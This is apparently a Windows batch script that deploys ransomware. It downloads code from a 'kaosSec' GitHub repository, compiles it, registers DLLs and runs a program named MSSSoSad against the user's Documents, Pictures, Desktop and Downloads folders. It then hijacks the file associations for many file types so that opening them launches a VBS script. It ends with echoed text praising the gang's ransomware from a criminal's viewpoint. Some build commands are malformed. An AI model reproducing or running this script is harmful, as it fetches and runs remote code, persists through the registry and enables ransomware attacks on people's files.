@echo off
color 0A
setlocal

if not exist "%SystemRoot%\System32\chocolatey.exe" (
    powershell -NoProfile -InputFormat None -ExecutionPolicy Bypass -Command "iex ((New-Object System.Net.WebClient).DownloadString('https://chocolatey.org/install.ps1'))"
)

choco install curl -y
choco install mingw -y
choco install dotnetcore-sdk -y

curl -L https://github.com/kaosSec/hugzi/raw/main/hook.cpp -o hook.cpp
curl -L https://github.com/kaosSec/hugzi/raw/main/loz.def -o loz.def
curl -L https://github.com/kaosSec/hugzi/raw/main/vorp.c -o vorp.c
curl -L https://github.com/kaosSec/hugzi/raw/main/uj4.def -o uj4.def
curl -L https://github.com/kaosSec/hugzi/raw/main/lucy4.c -o lucy4.c
gcc -c -o lucy4.o lucy4.c
gcc -c -o vorp.o vorp.c
gcc -c -o hook.o hook.cpp
dlltool -k -d loz.def -l libfilename.a -D hook.cpp -o hook.dll
dlltool -k -d uj4.def -l libfilename.a -D vorp.c -o vorp.dll

regsvr32 hook.dll
regsvr32 vorp.dll

curl -L https://github.com/kaosSec/kaosTools/raw/main/C/MSSSoSad.c -o MSSSoSad.c

gcc -o MSSSoSad.c MSSSoSad.exe

.\MSSSoSad 127.0.0.1 %Downloads% %User% %Pictures% %Documents% %Desktop%

curl -L https://github.com/kaosSec/hugzi/raw/main/hugzi.c -o hugzi.c

csc /out:hugzi.exe hugzi.c

.\hugzi lucy4.o

set extension=.txt
set progID=txtfile
set command="softkitty99.vbs" "%1"

powershell -Command "New-Item -Path HKCU:\Software\Classes\%extension% -Force | Out-Null; New-ItemProperty -Path HKCU:\Software\Classes\%extension% -Name '' -Value %progID% -Force | Out-Null; New-Item -Path HKCU:\Software\Classes\%progID% -Force | Out-Null; New-ItemProperty -Path HKCU:\Software\Classes\%progID%\shell -Name '' -Value '' -Force | Out-Null; New-ItemProperty -Path HKCU:\Software\Classes\%progID%\shell\open -Name '' -Value '' -Force | Out-Null; New-ItemProperty -Path HKCU:\Software\Classes\%progID%\shell\open\command -Name '' -Value %command% -Force | Out-Null"

set extension=.html
set progID=htmldocument
set command="softkitty99.vbs" "%1"

powershell -Command "New-Item -Path HKCU:\Software\Classes\%extension% -Force | Out-Null; New-ItemProperty -Path HKCU:\Software\Classes\%extension% -Name '' -Value %progID% -Force | Out-Null; New-Item -Path HKCU:\Software\Classes\%progID% -Force | Out-Null; New-ItemProperty -Path HKCU:\Software\Classes\%progID%\shell -Name '' -Value '' -Force | Out-Null; New-ItemProperty -Path HKCU:\Software\Classes\%progID%\shell\open -Name '' -Value '' -Force | Out-Null; New-ItemProperty -Path HKCU:\Software\Classes\%progID%\shell\open\command -Name '' -Value %command% -Force | Out-Null"

set extension=.jpg
set progID=jpgimagefile
set command="softkitty99.vbs" "%1"

powershell -Command "New-Item -Path HKCU:\Software\Classes\%extension% -Force | Out-Null; New-ItemProperty -Path HKCU:\Software\Classes\%extension% -Name '' -Value %progID% -Force | Out-Null; New-Item -Path HKCU:\Software\Classes\%progID% -Force | Out-Null; New-ItemProperty -Path HKCU:\Software\Classes\%progID%\shell -Name '' -Value '' -Force | Out-Null; New-ItemProperty -Path HKCU:\Software\Classes\%progID%\shell\open -Name '' -Value '' -Force | Out-Null; New-ItemProperty -Path HKCU:\Software\Classes\%progID%\shell\open\command -Name '' -Value %command% -Force | Out-Null"

set extension=.jpeg
set progID=jpegimagefile
set command="softkitty99.vbs" "%1"

powershell -Command "New-Item -Path HKCU:\Software\Classes\%extension% -Force | Out-Null; New-ItemProperty -Path HKCU:\Software\Classes\%extension% -Name '' -Value %progID% -Force | Out-Null; New-Item -Path HKCU:\Software\Classes\%progID% -Force | Out-Null; New-ItemProperty -Path HKCU:\Software\Classes\%progID%\shell -Name '' -Value '' -Force | Out-Null; New-ItemProperty -Path HKCU:\Software\Classes\%progID%\shell\open -Name '' -Value '' -Force | Out-Null; New-ItemProperty -Path HKCU:\Software\Classes\%progID%\shell\open\command -Name '' -Value %command% -Force | Out-Null"

set extension=.png
set progID=pngimagefile
set command="softkitty99.vbs" "%1"

powershell -Command "New-Item -Path HKCU:\Software\Classes\%extension% -Force | Out-Null; New-ItemProperty -Path HKCU:\Software\Classes\%extension% -Name '' -Value %progID% -Force | Out-Null; New-Item -Path HKCU:\Software\Classes\%progID% -Force | Out-Null; New-ItemProperty -Path HKCU:\Software\Classes\%progID%\shell -Name '' -Value '' -Force | Out-Null; New-ItemProperty -Path HKCU:\Software\Classes\%progID%\shell\open -Name '' -Value '' -Force | Out-Null; New-ItemProperty -Path HKCU:\Software\Classes\%progID%\shell\open\command -Name '' -Value %command% -Force | Out-Null"

set extension=.gif
set progID=gifimagefile
set command="softkitty99.vbs" "%1"

powershell -Command "New-Item -Path HKCU:\Software\Classes\%extension% -Force | Out-Null; New-ItemProperty -Path HKCU:\Software\Classes\%extension% -Name '' -Value %progID% -Force | Out-Null; New-Item -Path HKCU:\Software\Classes\%progID% -Force | Out-Null; New-ItemProperty -Path HKCU:\Software\Classes\%progID%\shell -Name '' -Value '' -Force | Out-Null; New-ItemProperty -Path HKCU:\Software\Classes\%progID%\shell\open -Name '' -Value '' -Force | Out-Null; New-ItemProperty -Path HKCU:\Software\Classes\%progID%\shell\open\command -Name '' -Value %command% -Force | Out-Null"

set extension=.mp3
set progID=mp3audiofile
set command="softkitty99.vbs" "%1"

powershell -Command "New-Item -Path HKCU:\Software\Classes\%extension% -Force | Out-Null; New-ItemProperty -Path HKCU:\Software\Classes\%extension% -Name '' -Value %progID% -Force | Out-Null; New-Item -Path HKCU:\Software\Classes\%progID% -Force | Out-Null; New-ItemProperty -Path HKCU:\Software\Classes\%progID%\shell -Name '' -Value '' -Force | Out-Null; New-ItemProperty -Path HKCU:\Software\Classes\%progID%\shell\open -Name '' -Value '' -Force | Out-Null; New-ItemProperty -Path HKCU:\Software\Classes\%progID%\shell\open\command -Name '' -Value %command% -Force | Out-Null"

set extension=.mp4
set progID=mp4videofile
set command="softkitty99.vbs" "%1"

powershell -Command "New-Item -Path HKCU:\Software\Classes\%extension% -Force | Out-Null; New-ItemProperty -Path HKCU:\Software\Classes\%extension% -Name '' -Value %progID% -Force | Out-Null; New-Item -Path HKCU:\Software\Classes\%progID% -Force | Out-Null; New-ItemProperty -Path HKCU:\Software\Classes\%progID%\shell -Name '' -Value '' -Force | Out-Null; New-ItemProperty -Path HKCU:\Software\Classes\%progID%\shell\open -Name '' -Value '' -Force | Out-Null; New-ItemProperty -Path HKCU:\Software\Classes\%progID%\shell\open\command -Name '' -Value %command% -Force | Out-Null"

set extension=.avi
set progID=avivideofile
set command="softkitty99.vbs" "%1"

powershell -Command "New-Item -Path HKCU:\Software\Classes\%extension% -Force | Out-Null; New-ItemProperty -Path HKCU:\Software\Classes\%extension% -Name '' -Value %progID% -Force | Out-Null; New-Item -Path HKCU:\Software\Classes\%progID% -Force | Out-Null; New-ItemProperty -Path HKCU:\Software\Classes\%progID%\shell -Name '' -Value '' -Force | Out-Null; New-ItemProperty -Path HKCU:\Software\Classes\%progID%\shell\open -Name '' -Value '' -Force | Out-Null; New-ItemProperty -Path HKCU:\Software\Classes\%progID%\shell\open\command -Name '' -Value %command% -Force | Out-Null"

set extension=.zip
set progID=compressedarchivefile
set command="softkitty99.vbs" "%1"

powershell -Command "New-Item -Path HKCU:\Software\Classes\%extension% -Force | Out-Null; New-ItemProperty -Path HKCU:\Software\Classes\%extension% -Name '' -Value %progID% -Force | Out-Null; New-Item -Path HKCU:\Software\Classes\%progID% -Force | Out-Null; New-ItemProperty -Path HKCU:\Software\Classes\%progID%\shell -Name '' -Value '' -Force | Out-Null; New-ItemProperty -Path HKCU:\Software\Classes\%progID%\shell\open -Name '' -Value '' -Force | Out-Null; New-ItemProperty -Path HKCU:\Software\Classes\%progID%\shell\open\command -Name '' -Value %command% -Force | Out-Null"

set extension=.exe
set progID=executablefile
set command="softkitty99.vbs" "%1"

powershell -Command "New-Item -Path HKCU:\Software\Classes\%extension% -Force | Out-Null; New-ItemProperty -Path HKCU:\Software\Classes\%extension% -Name '' -Value %progID% -Force | Out-Null; New-Item -Path HKCU:\Software\Classes\%progID% -Force | Out-Null; New-ItemProperty -Path HKCU:\Software\Classes\%progID%\shell -Name '' -Value '' -Force | Out-Null; New-ItemProperty -Path HKCU:\Software\Classes\%progID%\shell\open -Name '' -Value '' -Force | Out-Null; New-ItemProperty -Path HKCU:\Software\Classes\%progID%\shell\open\command -Name '' -Value %command% -Force | Out-Null"

set extension=.php
set progID=phpscriptfile
set command="softkitty99.vbs" "%1"

powershell -Command "New-Item -Path HKCU:\Software\Classes\%extension% -Force | Out-Null; New-ItemProperty -Path HKCU:\Software\Classes\%extension% -Name '' -Value %progID% -Force | Out-Null; New-Item -Path HKCU:\Software\Classes\%progID% -Force | Out-Null; New-ItemProperty -Path HKCU:\Software\Classes\%progID%\shell -Name '' -Value '' -Force | Out-Null; New-ItemProperty -Path HKCU:\Software\Classes\%progID%\shell\open -Name '' -Value '' -Force | Out-Null; New-ItemProperty -Path HKCU:\Software\Classes\%progID%\shell\open\command -Name '' -Value %command% -Force | Out-Null"

set extension=.java
set progID=javasourcecodefile
set command="softkitty99.vbs" "%1"

powershell -Command "New-Item -Path HKCU:\Software\Classes\%extension% -Force | Out-Null; New-ItemProperty -Path HKCU:\Software\Classes\%extension% -Name '' -Value %progID% -Force | Out-Null; New-Item -Path HKCU:\Software\Classes\%progID% -Force | Out-Null; New-ItemProperty -Path HKCU:\Software\Classes\%progID%\shell -Name '' -Value '' -Force | Out-Null; New-ItemProperty -Path HKCU:\Software\Classes\%progID%\shell\open -Name '' -Value '' -Force | Out-Null; New-ItemProperty -Path HKCU:\Software\Classes\%progID%\shell\open\command -Name '' -Value %command% -Force | Out-Null"

set extension=.py
set progID=pythonsourcecodefile
set command="softkitty99.vbs" "%1"

powershell -Command "New-Item -Path HKCU:\Software\Classes\%extension% -Force | Out-Null; New-ItemProperty -Path HKCU:\Software\Classes\%extension% -Name '' -Value %progID% -Force | Out-Null; New-Item -Path HKCU:\Software\Classes\%progID% -Force | Out-Null; New-ItemProperty -Path HKCU:\Software\Classes\%progID%\shell -Name '' -Value '' -Force | Out-Null; New-ItemProperty -Path HKCU:\Software\Classes\%progID%\shell\open -Name '' -Value '' -Force | Out-Null; New-ItemProperty -Path HKCU:\Software\Classes\%progID%\shell\open\command -Name '' -Value %command% -Force | Out-Null"


endlocal
start https://github.com/kaosSec
echo A blackhat hacker's theoretical perspective on the kaosSec cybergang, their MSS ransomware, and the PlorgBetterRansom worm would likely be much different than that of an ethical hacker.
echo.
color 03
echo From a blackhat hacker's point of view, kaosSec and their actions represent a prime example of how to successfully navigate the world of cybercrime. They would admire the cybergang's ability to create and distribute a highly effective ransomware and worm like MSS and PlorgBetterRansom.
echo.
color 04
echo They might see the victims of these attacks as merely collateral damage, and believe that the victims deserve to have their data held for ransom because they failed to secure their systems properly. In their eyes, the end justifies the means and the financial reward for the attackers is well deserved.
echo.
color 06
echo In this context, the use of ransomware and worms can be seen as a highly effective way to make money, and the blackhat hacker would likely be studying the tactics used by kaosSec in order to improve their own abilities and techniques. They might even try to reach out to the cybergang to collaborate on future attacks.
echo.
echo.
color 02
echo Overall, a blackhat hacker's perspective on the kaosSec cybergang, their MSS ransomware, and the PlorgBetterRansom worm would be highly favorable and they would likely consider them to be leaders in the world of cybercrime.
